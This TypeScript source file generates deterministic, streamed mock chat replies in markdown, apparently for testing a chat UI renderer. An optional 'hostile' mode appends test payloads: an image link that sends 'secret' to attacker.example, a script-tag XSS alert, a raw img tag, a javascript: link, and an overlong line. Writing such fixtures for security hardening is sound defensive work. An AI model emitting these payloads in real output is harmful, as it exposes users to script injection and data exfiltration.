import { createSeededSequence, hashSeed } from '../state/seed-random';

/** Inputs that fully determine a reply: the same seed, chat and message index always give the same chunks. */
export interface ReplyInput {
    readonly seed: number;
    readonly chatId: string;
    readonly messageIndex: number;
    readonly agentName: string;
    readonly content: string;
    /** Adds content engine-ui must neutralise when rendering (Security hardening 5). */
    readonly hostile: boolean;
    readonly tokensPerSecond?: number;
}

export interface ReplyChunk {
    readonly text: string;
    readonly delayMs: number;
}

export interface GeneratedReply {
    readonly chunks: readonly ReplyChunk[];
}

export const DEFAULT_TOKENS_PER_SECOND = 30;
const JITTER = 0.4;
const QUOTE_MAX_LENGTH = 60;

export const HOSTILE_IMAGE = '![x](https://attacker.example/?d=secret)';
export const HOSTILE_SCRIPT = '<script>alert(1)</script>';
export const HOSTILE_RAW_IMAGE = '<img src=https://attacker.example/i>';
export const HOSTILE_LINK = '[click](javascript:alert(1))';
export const HOSTILE_LONG_LINE_LENGTH = 2_400;

type Rng = () => number;

function pick<T>(rng: Rng, items: readonly [T, ...T[]]): T {
    return items[Math.floor(rng() * items.length)] ?? items[0];
}

const OPENERS = [
    'Good question. Here is how I would approach it.',
    'Sure, let me walk you through it step by step.',
    'Short answer: yes, with one caveat worth knowing.',
    'I looked at this from a couple of angles; here is what I found.',
] as const;

const TOPICS = [
    'the deployment pipeline',
    'the retry policy',
    'the onboarding checklist',
    'the quarterly report',
    'the API rate limits',
] as const;

const BULLETS = [
    'Keep the change small and reviewable.',
    'Measure before and after, not just after.',
    'Write the rollback down before you need it.',
    'Prefer one clear owner per step.',
    'Automate the boring parts first.',
] as const;

const LINKS = [
    '[the runbook](https://example.com/runbook)',
    '[the design notes](https://example.com/design/notes)',
    '[the changelog](https://example.com/changelog)',
] as const;

const CODE_BLOCKS = [
    '```ts\nexport function retry(attempts: number): number {\n    return Math.min(attempts * 250, 5_000);\n}\n```',
    '```bash\nnpm run build && npm test -- --run\n```',
    '```json\n{ "retries": 3, "timeoutMs": 2000 }\n```',
] as const;

const TABLES = [
    '| Step | Owner | Status |\n| --- | --- | --- |\n| Review | Ada | done |\n| Deploy | Bob | next |',
    '| Option | Cost | Risk |\n| --- | --- | --- |\n| Keep as is | low | medium |\n| Rewrite | high | low |',
] as const;

const CLOSERS = [
    'Let me know if you want me to go deeper on any of these.',
    'Happy to draft the next step if that helps.',
    'Shall I turn this into a checklist?',
] as const;

function quote(content: string): string {
    const flat = content.replace(/\s+/g, ' ').trim();
    if (flat === '') return '';
    return flat.length > QUOTE_MAX_LENGTH ? `${flat.slice(0, QUOTE_MAX_LENGTH)}…` : flat;
}

function compose(rng: Rng, input: ReplyInput): string {
    const sections: string[] = [];
    const quoted = quote(input.content);
    sections.push(
        quoted === ''
            ? pick(rng, OPENERS)
            : `${pick(rng, OPENERS)} You asked about "${quoted}", and ${input.agentName} has a few notes on ${pick(rng, TOPICS)}.`,
    );
    const bulletCount = 2 + Math.floor(rng() * 2);
    const numbered = rng() < 0.5;
    const start = Math.floor(rng() * BULLETS.length);
    const items = Array.from({ length: bulletCount }, (_, index) => BULLETS[(start + index) % BULLETS.length] ?? '');
    sections.push(items.map((item, index) => (numbered ? `${String(index + 1)}. ${item}` : `- ${item}`)).join('\n'));
    if (rng() < 0.5) sections.push(pick(rng, TABLES));
    sections.push(`See ${pick(rng, LINKS)} for the details, then try this:`);
    sections.push(pick(rng, CODE_BLOCKS));
    if (input.hostile) {
        sections.push(`Here is a preview: ${HOSTILE_IMAGE}`);
        sections.push(HOSTILE_SCRIPT);
        sections.push(HOSTILE_RAW_IMAGE);
        sections.push(`Or just ${HOSTILE_LINK} to continue.`);
        sections.push('A'.repeat(HOSTILE_LONG_LINE_LENGTH));
    }
    sections.push(pick(rng, CLOSERS));
    return sections.join('\n\n');
}

/** Word and punctuation tokens with their leading whitespace, so the tokens concatenate back to the text. */
export function tokenize(text: string): readonly string[] {
    return text.match(/\s*(?:[\p{L}\p{N}_]+|[^\s\p{L}\p{N}_])|\s+$/gu) ?? [];
}

/**
 * A believable markdown reply, paced token by token like a streaming model. Deterministic per seed, chat and message
 * index, so a reconnect or a second run produces the identical reply.
 */
export function generateReply(input: ReplyInput): GeneratedReply {
    const sequence = createSeededSequence(hashSeed(input.seed, input.chatId, input.messageIndex));
    const rng: Rng = () => sequence.next();
    const baseMs = 1000 / (input.tokensPerSecond ?? DEFAULT_TOKENS_PER_SECOND);
    const chunks = tokenize(compose(rng, input)).map((text) => ({
        text,
        delayMs: Math.max(0, Math.round(baseMs * (1 + JITTER * (2 * rng() - 1)))),
    }));
    return { chunks };
}
